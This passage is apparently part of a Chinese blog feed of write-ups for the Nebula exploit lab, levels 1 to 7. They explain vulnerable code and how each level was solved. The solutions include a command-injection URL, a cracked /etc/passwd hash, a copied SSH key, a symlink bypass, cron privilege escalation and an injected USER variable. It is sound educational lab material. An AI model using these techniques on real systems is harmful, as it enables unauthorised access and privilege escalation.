class="tag">&lt;<span class="name">body</span>&gt;</span><span class="tag">&lt;<span class="name">pre</span>&gt;</span>&quot;);</span><br><span class="line"></span><br><span class="line">  @output = `ping -c 3 $host 2&gt;&amp;1`;</span><br><span class="line">  foreach $line (@output) &#123; print &quot;$line&quot;; &#125;</span><br><span class="line"></span><br><span class="line">  print(&quot;<span class="tag">&lt;/<span class="name">pre</span>&gt;</span><span class="tag">&lt;/<span class="name">body</span>&gt;</span><span class="tag">&lt;/<span class="name">html</span>&gt;</span>&quot;);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># check if Host set. if not, display normal page, etc</span><br><span class="line"></span><br><span class="line">ping(param(&quot;Host&quot;));</span><br></pre></td></tr></table></figure><h3 id="Solution"><a href="#Solution" class="headerlink" title="Solution:"></a>Solution:</h3><p>在/home/flag07这个目录中，有一个index.cgi和thttpd.conf，既然是一个cgi程序，我们需要客户端访问，根据thttpd.conf配置文件中的内容，得知端口号是7007。</p><blockquote><p><code>index.cgi</code> 是一个 <strong>CGI（Common Gateway Interface）脚本文件</strong>，通常用于 Web 服务器中，用来处理动态网页请求。</p><hr><p>🧩 详细解释：</p><p>✅ 什么是 <code>.cgi</code>？</p><ul><li><code>.cgi</code> 是一种常见的脚本文件扩展名，表示这个文件是通过 CGI 机制运行的。</li><li>CGI 是 Web 服务器和外部程序（脚本）之间的一个接口协议。</li><li>它允许 Web 服务器调用程序（比如 Python、Perl、Bash 脚本）来生成动态内容返回给浏览器。</li></ul></blockquote><p>这关考验的是分析这个index.cgi，我们先看下它的源码：</p><figure class="highlight perl"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/perl</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> CGI <span class="string">qw&#123;param&#125;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;Content-type: text/html\n\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">sub</span> <span class="title">ping</span> </span>&#123;</span><br><span class="line">        <span class="variable">$host</span> = <span class="variable">$_</span>[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">print</span>(<span class="string">&quot;&lt;html&gt;&lt;head&gt;&lt;title&gt;Ping results&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;pre&gt;&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">@output</span> = <span class="string">`ping -c 3 $host 2&gt;&amp;1`</span>;</span><br><span class="line">        <span class="keyword">foreach</span> <span class="variable">$line</span> (<span class="variable">@output</span>) &#123; <span class="keyword">print</span> <span class="string">&quot;<span class="variable">$line</span>&quot;</span>; &#125; </span><br><span class="line"></span><br><span class="line">        <span class="keyword">print</span>(<span class="string">&quot;&lt;/pre&gt;&lt;/body&gt;&lt;/html&gt;&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># check if Host set. if not, display normal page, etc</span></span><br><span class="line"></span><br><span class="line">ping(param(<span class="string">&quot;Host&quot;</span>));</span><br></pre></td></tr></table></figure><blockquote><p>🧠 逐行详解</p><hr><p><code>#!/usr/bin/perl</code></p><ul><li>指定该脚本使用 Perl 解释器执行。</li></ul><hr><p><code>use CGI qw&#123;param&#125;;</code></p><ul><li><p>引入 Perl 的 <strong>CGI 模块</strong>，用于处理 Web 表单参数。</p></li><li><p><code>param(&quot;Host&quot;)</code> 会获取用户通过 GET 或 POST 传入的 <code>Host</code> 参数值。</p></li></ul><hr><p><code>print &quot;Content-type: text/html\n\n&quot;;</code></p><ul><li><p>CGI 的标准输出格式，表示返回的是 HTML 网页内容。</p></li><li><p>必须写在输出 HTML 内容前，否则浏览器会报错。</p></li></ul><hr><p><code>sub ping &#123; ... &#125;</code></p><ul><li>定义一个名为 <code>ping</code> 的子程序，用于执行 ping 操作。</li></ul><p>其中：</p><figure class="highlight perl"><table><tr><td class="code"><pre><span class="line"><span class="variable">$host</span> = <span class="variable">$_</span>[<span class="number">0</span>];</span><br></pre></td></tr></table></figure><ul><li>接收传入的第一个参数，赋值给 <code>$host</code>。</li></ul><hr><p><code>@output = `ping -c 3 $host 2&gt;&amp;1`;</code></p><ul><li><p>执行系统命令：<code>ping -c 3 $host</code>，即 ping 指定主机 3 次。</p></li><li><p>用反引号执行命令并捕获输出（标准输出和错误合并到一起）。</p></li><li><p><code>2&gt;&amp;1</code> 是将标准错误重定向到标准输出。</p></li></ul><hr><p><code>foreach $line (@output) &#123; print &quot;$line&quot;; &#125;</code></p><ul><li>遍历 ping 命令的每一行输出，逐行打印到网页中。</li></ul><hr><p><code>ping(param(&quot;Host&quot;));</code></p><ul><li><p>调用 <code>ping()</code> 函数，并传入 <code>Host</code> 参数的值。</p></li><li><p>比如访问：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://target.com/index.cgi?Host=8.8.8.8</span><br></pre></td></tr></table></figure><p>就会执行：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ping -c 3 8.8.8.8</span><br></pre></td></tr></table></figure></li></ul><hr></blockquote><p>总结一下，就是这段代码的功能是调用外部的ping命令去ping指定的ip地址，ip地址通过参数<code>$host=$_[0]</code>获得。然后加了-c参数——指定了发送数据包的数量为3。最后，程序会把ping的结果返回到客户端的浏览器中。</p><p>我们先配置好虚拟机的地址，保障实体机的系统可以正常访问，确保能互相ping通（我这里使用的都是桥接模式）。在Kali中访问<a href="http://192.168.3.151:7007/index.cgi可以访问如下：">http://192.168.3.151:7007/index.cgi可以访问如下：</a> (192.168.3.151是Nebula的地址)</p><p><img src="https://cdn.jsdelivr.net/gh/hxd77/BlogImage/Blog/image-20250605165525529.png" alt="image-20250605165525529"></p><p>然后提交URL：<a href="http://192.168.3.151:7007/index.cgi?Host=127.0.0.1">http://192.168.3.151:7007/index.cgi?Host=127.0.0.1</a> 可以得到：</p><p><img src="https://cdn.jsdelivr.net/gh/hxd77/BlogImage/Blog/image-20250605173943563.png" alt="image-20250605173943563"></p><p>这段Perl脚本的漏洞出现在以下代码上：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@output = `ping -c 3 $host 2&gt;&amp;1`;</span><br></pre></td></tr></table></figure><p>这句出现了可执行任意文件漏洞。在Perl中，“`”符号之间的内容是调用的外部命令。</p><p>然后在Kali浏览器中输入<a href="http://192.168.3.151:7007/index.cgi?Host=127.0.0.1;getflag">http://192.168.3.151:7007/index.cgi?Host=127.0.0.1;getflag</a> 即可得到回显结果</p><p><img src="https://cdn.jsdelivr.net/gh/hxd77/BlogImage/Blog/image-20250605173833294.png" alt="image-20250605173833294"></p><p>进入脚本后执行的是<code>ping -c 3 127.0.0.1 ;getflag 2&gt;&amp;1</code>这其实执行的是两条指令<code>ping -c 3 127.0.0.1</code>和<code>getflag</code>。在我实验的过程中，我发现如果执行太多次HTTP请求访问会导致访问链接被拒绝。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 学习 </tag>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Exploit-Excercise-Nebula-6</title>
      <link href="/2025/06/03/Exploit-Excercise-Nebula-6/"/>
      <url>/2025/06/03/Exploit-Excercise-Nebula-6/</url>
      
        <content type="html"><![CDATA[<h2 id="Level-06-——-破解Linux登录密码"><a href="#Level-06-——-破解Linux登录密码" class="headerlink" title="Level 06 —— 破解Linux登录密码"></a>Level 06 —— 破解Linux登录密码</h2><h3 id="详情："><a href="#详情：" class="headerlink" title="详情："></a>详情：</h3><p>flag06账户凭据来自旧版Unix系统。要执行此级别，请以level06账户和密码level06登录。此级别的文件位于/home/flag06。</p><h3 id="Solution"><a href="#Solution" class="headerlink" title="Solution:"></a>Solution:</h3><p>根据题目所述，flag06这个账号的认证凭据是按照传统UNIX的方法储存的——意味着密文是存储在/etc/passwd里的，而不是/etc/shadow中的——因为把密码存到passwd里不安全，所以以后的Linux发行版都将加密后的密码单独存放到/etc/shadow中的。</p><p>所以可以直接读取/etc/passwd里flag加密后的密码：</p><p><img src="https://cdn.jsdelivr.net/gh/hxd77/BlogImage/Blog/image-20250603215207597.png" alt="image-20250603215207597"></p><p>这里flag06后面跟着是密码的哈希值。</p><p>在/tmp中新建一个passwd文件内容如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag06:ueqwOCnSGdsuM:993:993::/home/flag06:/bin/sh</span><br></pre></td></tr></table></figure><p>接着从<a href="http://www.openwall.com/john/">http://www.openwall.com/john/</a> 下载john的源码包并编译（不会的请见<a href="https://github.com/openwall/john/blob/bleeding-jumbo/doc/INSTALL">doc/INSTALL</a>）：</p><p>但是这里我是直接在Kali Linux上用john破解的（Kali Linux上自带john）：</p><p><img src="https://cdn.jsdelivr.net/gh/hxd77/BlogImage/Blog/image-20250603220640070.png" alt="image-20250603220640070"></p><p>发现flag06账户的密码是hello，直接登录flag06用户：</p><p><img src="https://cdn.jsdelivr.net/gh/hxd77/BlogImage/Blog/image-20250603220747745.png" alt="image-20250603220747745"></p>]]></content>
      
      
      <categories>
          
          <category> Exploit-Excercise-Nebula </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习 </tag>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Exploit-Excercise-Nebula-5</title>
      <link href="/2025/06/03/Exploit-Excercise-Nebula-5/"/>
      <url>/2025/06/03/Exploit-Excercise-Nebula-5/</url>
      
        <content type="html"><![CDATA[<h2 id="Level-05-——-窃取机密文件"><a href="#Level-05-——-窃取机密文件" class="headerlink" title="Level 05 —— 窃取机密文件"></a>Level 05 —— 窃取机密文件</h2><h3 id="详情："><a href="#详情：" class="headerlink" title="详情："></a>详情：</h3><p>检查flag05目录。您正在寻找弱目录权限。要执行此级别，请以level05账户和密码level05登录。此级别的文件位于/home/flag05。</p><h3 id="Solution"><a href="#Solution" class="headerlink" title="Solution:"></a>Solution:</h3><p>根据题目所述，在/home/flag05里，藏着一个重要的文件。我们的任务就是窃取这个文件。转到目录/home/flag05下，用ls -al命令查看列出所有文件：</p><p><img src="https://cdn.jsdelivr.net/gh/hxd77/BlogImage/Blog/image-20250603211444787.png" alt="image-20250603211444787"></p><p>根据文件名来判断重要的文件，这里有两个比较重要，第一个是.backup，第二个是.ssh，前者我们可以理解成一个备份文件，应该是重要文件的备份；后者，或许保存了私钥，如果得手，或许就可以ssh了，但是level05这个账号对.ssh的权限不够。不过.backup倒是有足够的权限进入（可以看出后面其他用户的权限是r-x，说明可以进行读和执行）：</p><p><img src="https://cdn.jsdelivr.net/gh/hxd77/BlogImage/Blog/image-20250603212124362.png" alt="image-20250603212124362"></p><p>.backup里有个压缩文件，需要我们解压，不可解压到当前目录，因为没有写入权限。得把它解压到/tmp（记得/tmp权限很低）中，看看有什么东西：</p><p><img src="https://cdn.jsdelivr.net/gh/hxd77/BlogImage/Blog/image-20250603212351890.png" alt="image-20250603212351890"></p><p>是备份的key，如此以来，我们就可以用私钥以flag05用户登录。把.ssh复制保存到level05的home目录中（ssh验证时用的私钥公钥就放在home目录中的.ssh目录里），然后ssh登录：</p><p><img src="https://cdn.jsdelivr.net/gh/hxd77/BlogImage/Blog/image-20250603212805006.png" alt="image-20250603212805006"></p><p>登录成功后执行getflag：</p><p><img src="https://cdn.jsdelivr.net/gh/hxd77/BlogImage/Blog/image-20250603212837036.png" alt="image-20250603212837036"></p>]]></content>
      
      
      <categories>
          
          <category> Exploit-Excercise-Nebula </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习 </tag>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Exploit-Excercise-Nebula-4</title>
      <link href="/2025/06/02/Exploit-Excercise-Nebula-4/"/>
      <url>/2025/06/02/Exploit-Excercise-Nebula-4/</url>
      
        <content type="html"><![CDATA[<h2 id="Level-04-——-绕过限制获得token"><a href="#Level-04-——-绕过限制获得token" class="headerlink" title="Level 04 —— 绕过限制获得token"></a>Level 04 —— 绕过限制获得token</h2><h3 id="详情："><a href="#详情：" class="headerlink" title="详情："></a>详情：</h3><p>这一关需要读取令牌文件，但代码限制了可读取的文件数量。想办法绕过它吧。要执行此级别，请以 level04 帐户和密码登录。此级别的文件位于 /home/flag04。flag04程序源代码如下：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv, <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">1024</span>];</span><br><span class="line">  <span class="type">int</span> fd, rc;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(argc == <span class="number">1</span>) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;%s [file to read]\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">      <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(<span class="built_in">strstr</span>(argv[<span class="number">1</span>], <span class="string">&quot;token&quot;</span>) != <span class="literal">NULL</span>) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;You may not access &#x27;%s&#x27;\n&quot;</span>, argv[<span class="number">1</span>]);</span><br><span class="line">      <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  fd = open(argv[<span class="number">1</span>], O_RDONLY);</span><br><span class="line">  <span class="keyword">if</span>(fd == <span class="number">-1</span>) &#123;</span><br><span class="line">      err(EXIT_FAILURE, <span class="string">&quot;Unable to open %s&quot;</span>, argv[<span class="number">1</span>]);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  rc = read(fd, buf, <span class="keyword">sizeof</span>(buf));</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(rc == <span class="number">-1</span>) &#123;</span><br><span class="line">      err(EXIT_FAILURE, <span class="string">&quot;Unable to read fd %d&quot;</span>, fd);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  write(<span class="number">1</span>, buf, rc);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Solution："><a href="#Solution：" class="headerlink" title="Solution："></a>Solution：</h3><p>在/home/flag04中有两个文件，一个是可执行文件，一个是token文本文件。要求绕过flag04的限制来读出token的内容，这个token就是账号flag04的登录密码。</p><p>我们可以通过ls -al看到，token文件的权限是-rw———-，所属用户是flag04，也就是说，除root权限外只有flag04这个用户可以对它进行读写操作。</p><p><img src="https://cdn.jsdelivr.net/gh/hxd77/BlogImage/Blog/image-20250602205546699.png" alt="image-20250602205546699"></p><p>而flag04这个可执行程序的所属用户组是level04，而我们的用户level04也是属于用户组level04的。而用户组对flag04这个程序只有x（执行）权限，所以只有通过flag04下手了。仔细看flag04源代码，找出问题：</p><p>注意代码第23行：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">fd = open(argv[<span class="number">1</span>], O_RDONLY);</span><br><span class="line"><span class="keyword">if</span>(fd == <span class="number">-1</span>) &#123;</span><br><span class="line">    err(EXIT_FAILURE, <span class="string">&quot;Unable to open %s&quot;</span>, argv[<span class="number">1</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>🧠 分析逐行含义</p><p>🔹 第 1 行：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">&gt;fd = open(argv[<span class="number">1</span>], O_RDONLY);</span><br></pre></td></tr></table></figure><ul><li><p><code>open()</code> 是一个系统调用，用来<strong>打开一个文件</strong>。</p></li><li><p><code>argv[1]</code> 是命令行参数，表示用户运行程序时传入的第一个参数，即文件路径。</p></li><li><p><code>O_RDONLY</code> 是标志，表示<strong>以只读方式打开</strong>。</p></li><li><p><code>fd</code> 是返回的文件描述符，如果打开成功，会是一个大于等于 0 的整数；否则会返回 <code>-1</code>。</p></li></ul><p>🔹 第 2-4 行：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">&gt;<span class="keyword">if</span>(fd == <span class="number">-1</span>) &#123;</span><br><span class="line"> err(EXIT_FAILURE, <span class="string">&quot;Unable to open %s&quot;</span>, argv[<span class="number">1</span>]);</span><br><span class="line">&gt;&#125;</span><br></pre></td></tr></table></figure><ul><li><p>如果 <code>open()</code> 返回 <code>-1</code>，说明<strong>文件打开失败</strong>。</p></li><li><p><code>err()</code> 是一个标准库函数（在 <code>&lt;err.h&gt;</code> 中），用于打印错误并退出程序。</p></li><li><p><code>EXIT_FAILURE</code> 是退出状态码（值通常为 1），表示失败。</p></li><li><p><code>&quot;Unable to open %s&quot;</code> 是错误信息模板，<code>%s</code> 会被 <code>argv[1]</code> 替换（即你试图打开的文件名）。</p></li><li><p><code>err()</code> 会自动在你提供的消息后加上系统错误原因（来自 <code>errno</code>)</p></li></ul></blockquote><p>它是对参数argv[1]进行open操作，argv[1]输入的是文件名，但是这个文件名不能含有”token”字符串，因为在代码18行进行了限制，如果文件名中包含了”token”字符串，程序会直接提示“You may not access token”，并且退出执行。</p><blockquote><p>🧠 分析</p><p>🔹 <code>strstr(argv[1], &quot;token&quot;) != NULL</code></p><ul><li><p><code>strstr(a, b)</code> 是 C 标准库函数，用于在字符串 <code>a</code> 中查找子串 <code>b</code>。</p></li><li><p>如果找到了，返回第一次出现的位置的指针；如果找不到，返回 <code>NULL</code>。</p></li><li><p>所以 <code>strstr(argv[1], &quot;token&quot;) != NULL</code> 意思是：<code>argv[1]</code> 中包含字符串 <code>&quot;token&quot;</code>。</p></li></ul></blockquote><p>问题在与：strstr函数，它会找出指定的关键字（这里是token）在字符串中第一次出现的位置，如果没有找到，就返回NULL。因此，只要我们保证在文件名里不包含“token”字符串就可以了。虽然我们没有权限更改token文件的文件名，但是我们可以创造一个软链接，指向/home/flag04/token，再执行flag04：</p><p><img src="https://cdn.jsdelivr.net/gh/hxd77/BlogImage/Blog/image-20250602212435747.png" alt="image-20250602212435747"></p><p>通过执行flag04，然后传参数token读出了token的值，这个token就是flag04用户的密码，登录并执行getflag。</p><p><img src="https://cdn.jsdelivr.net/gh/hxd77/BlogImage/Blog/image-20250602212826477.png" alt="image-20250602212826477"></p>]]></content>
      
      
      <categories>
          
          <category> Exploit-Excercise-Nebula </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习 </tag>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Exploit-Excercise-Nebula-3</title>
      <link href="/2025/06/02/Exploit-Excercise-Nebula-3/"/>
      <url>/2025/06/02/Exploit-Excercise-Nebula-3/</url>
      
        <content type="html"><![CDATA[<h2 id="Level-03-——-利用计划任务提权"><a href="#Level-03-——-利用计划任务提权" class="headerlink" title="Level 03 —— 利用计划任务提权"></a>Level 03 —— 利用计划任务提权</h2><h3 id="详情："><a href="#详情：" class="headerlink" title="详情："></a>详情：</h3><p>检查 flag03 的主目录并记下那里的文件。有一个 crontab 每隔几分钟就会调用一次。要执行此级别，请以 level03 帐户和密码登录。此级别的文件位于 /home/flag03。</p><h3 id="Solution："><a href="#Solution：" class="headerlink" title="Solution："></a>Solution：</h3><p>根据官方的提示，这关有一个Crontab脚本，它会每间隔两分钟自动执行<code>/home/flag03</code>下的<code>writablel.sh</code>。（可以用nebula账号登录系统，通过<code>sudo ls /var/spool/cron/crontabs</code>看到Crontab的设置）</p><blockquote><p><code>crontab</code> 是 Linux/Unix 系统中用来<strong>定时执行任务</strong>的一种机制，全称是 “cron table”。</p><p>它允许你按照设定的时间表，自动执行命令或脚本 —— 类似“闹钟”或“自动任务计划”。</p></blockquote><p>而writable.sh内容如下：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> /home/flag03/writable.d/*;<span class="keyword">do</span></span><br><span class="line">    (<span class="built_in">ulimit</span> -t 5;bash -x <span class="string">&quot;<span class="variable">$i</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">rm</span> -f <span class="string">&quot;<span class="variable">$i</span>&quot;</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure><p>这个Crontab脚本做的事是自动执行<code>/home/flag03/writable.d</code>目录里的文件，之后再删除。<code>ulimit -t 5</code>限制当前子进程最多只能使用 5 秒 <strong>CPU 时间</strong>，这个不要紧，最重要的是我们要利用<code>writable.d</code>这个目录来完成exploit，这个crontab是以<code>flag03</code>的用户创建的，因此每次执行都是<code>flag03</code>这个身份，而<code>writable.d</code>这个目录任何人都可以读写，所以只需要放一个可执行的脚本在<code>writable.d</code>里，等着它自动运行：</p><p><img src="https://cdn.jsdelivr.net/gh/hxd77/BlogImage/Blog/image-20250602203201215.png" alt="image-20250602203201215"></p><p>等待两分钟<code>writable.sh</code>将会被执行，由于<code>writable.sh</code>的执行，导致<code>writable.d</code>里的run也会随着被执行，接着我们查看结果。本关很好地体现出权限不严格导致的结果。</p>]]></content>
      
      
      <categories>
          
          <category> Exploit-Excercise-Nebula </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习 </tag>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Exploit-Excercise-Nebula-2</title>
      <link href="/2025/06/02/Exploit-Excercise-Nebula-2/"/>
      <url>/2025/06/02/Exploit-Excercise-Nebula-2/</url>
      
        <content type="html"><![CDATA[<h2 id="Level-02——环境变量注入"><a href="#Level-02——环境变量注入" class="headerlink" title="Level 02——环境变量注入"></a>Level 02——环境变量注入</h2><h3 id="详情："><a href="#详情：" class="headerlink" title="详情："></a>详情：</h3><p>以下程序中存在一个允许任意程序执行的漏洞，你能找到它吗？要执行此级别，请使用 level02 帐户和密码登录。此级别的文件位于 /home/flag02。    </p><p>这关的程序存在一个可执行任意程序的漏洞，题目提供了完整的源码：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv, <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *buffer;</span><br><span class="line">  <span class="type">gid_t</span> gid;</span><br><span class="line">  <span class="type">uid_t</span> uid;</span><br><span class="line"></span><br><span class="line">  gid = getegid();</span><br><span class="line">  uid = geteuid();</span><br><span class="line"></span><br><span class="line">  setresgid(gid, gid, gid);</span><br><span class="line">  setresuid(uid, uid, uid);</span><br><span class="line"></span><br><span class="line">  buffer = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  asprintf(&amp;buffer, <span class="string">&quot;/bin/echo %s is cool&quot;</span>, getenv(<span class="string">&quot;USER&quot;</span>));</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;about to call system(\&quot;%s\&quot;)\n&quot;</span>, buffer);</span><br><span class="line"></span><br><span class="line">  system(buffer);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Solution："><a href="#Solution：" class="headerlink" title="Solution："></a>Solution：</h3><p>在kali中通过ssh远程连接level02@nebula，以后就不再赘述了。</p><p>和第一关思路一样，我们先找到执行系统命令的函数——函数体的最后一句<code>system</code>，并且可以看到<code>system</code>执行的字符串来源于变量，那么就应该回溯<code>buffer</code>变量是怎么生成的。</p><p>可看到<code>buffer</code>变量是经过<code>asprintf</code>拼接而成，而<code>asprintf</code>的第二个参数调用了<code>getenv</code>函数去获取环境变量<code>USER</code>的值（USER是当前登录的用户名）。有了第一关的经验，我们就知道环境变量是依赖于外部控制，默认下，<code>asprintf</code>组合的最终结果是：<code>/bin/echo level02 is cool</code>。</p><blockquote><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">&gt;asprintf(&amp;buffer, <span class="string">&quot;/bin/echo %s is cool&quot;</span>, getenv(<span class="string">&quot;USER&quot;</span>));</span><br></pre></td></tr></table></figure><p>的作用是：<strong>构造一个字符串 <code>/bin/echo 用户名 is cool</code> 并将其存入 <code>buffer</code> 中。</strong></p><hr><p>✅ 分解解释</p><p><code>getenv(&quot;USER&quot;)</code></p><ul><li><p>调用系统函数获取当前环境变量 <code>USER</code> 的值</p></li><li><p>比如，如果当前登录用户是 <code>ctfplayer</code>，那么返回值是 <code>&quot;ctfplayer&quot;</code></p></li></ul><hr><p><code>asprintf(&amp;buffer, &quot;/bin/echo %s is cool&quot;, getenv(&quot;USER&quot;))</code></p><ul><li><p><code>asprintf</code> 是一个格式化字符串函数，类似 <code>sprintf</code>，但会自动 <strong>分配内存</strong> 给 <code>buffer</code></p></li><li><p>格式化字符串：<code>&quot;/bin/echo %s is cool&quot;</code>，其中 <code>%s</code> 会被 <code>getenv(&quot;USER&quot;)</code> 的值替换</p></li></ul></blockquote><p>由于环境变量<code>USER</code>是可以控制的，所以可以把<code>USER</code>变量替换掉。<code>USER</code>变量如果换成<code>;bin/getflag</code>，等于是在执行了以下两句：（执行多条命令用”;”隔开）</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/bin/echo;</span><br><span class="line">/bin/getflag</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/hxd77/BlogImage/Blog/image-20250602193915656.png" alt="image-20250602193915656"></p>]]></content>
      
      
      <categories>
          
          <category> Exploit-Excercise-Nebula </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习 </tag>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Exploit-Excercise-Nebula-1</title>
      <link href="/2025/06/02/Exploit-Excercise-Nebula-1/"/>
      <url>/2025/06/02/Exploit-Excercise-Nebula-1/</url>
      
        <content type="html"><![CDATA[<h2 id="Level-01——环境变量的利用"><a href="#Level-01——环境变量的利用" class="headerlink" title="Level 01——环境变量的利用"></a>Level 01——环境变量的利用</h2><h3 id="详情："><a href="#详情：" class="headerlink" title="详情："></a>详情：</h3><p>以下程序中存在一个允许任意程序执行的漏洞，你能找到它吗？要执行此级别，请使用 level01 帐户和密码登录。此级别的文件位于 /home/flag01。</p><p>flag01的源码官方已经提供，这道题目是让我们分析该代码，找出代码中存在的一处可执行任意文件漏洞。题目提供的代码如下：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv, <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">gid_t</span> gid;</span><br><span class="line">  <span class="type">uid_t</span> uid;</span><br><span class="line">  gid = getegid();</span><br><span class="line">  uid = geteuid();</span><br><span class="line"></span><br><span class="line">  setresgid(gid, gid, gid);</span><br><span class="line">  setresuid(uid, uid, uid);</span><br><span class="line"></span><br><span class="line">  system(<span class="string">&quot;/usr/bin/env echo and now what?&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h3><p>在Kali中ssh连接level01@nebula:</p><p><img src="https://cdn.jsdelivr.net/gh/hxd77/BlogImage/TyporaImage/image-20250602131944280.png" alt="image-20250602131944280"></p><p>分析可执行任意文件漏洞的重点是先找到程序中执行命令的地方。通过分析上面的源码中可以看到程序调用了system函数，system函数可以执行指定的Shell命令，在这里system执行的<code>/usr/bin/env</code>命令，注意system的参数是一个字符串而非变量，所以我们不能直接控制system函数的行为。那重点就放在了env命令上，通过man env得到的帮助如下：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">env</span> - run a program <span class="keyword">in</span> a modified environment</span><br></pre></td></tr></table></figure><blockquote><p><code>/usr/bin/env</code> 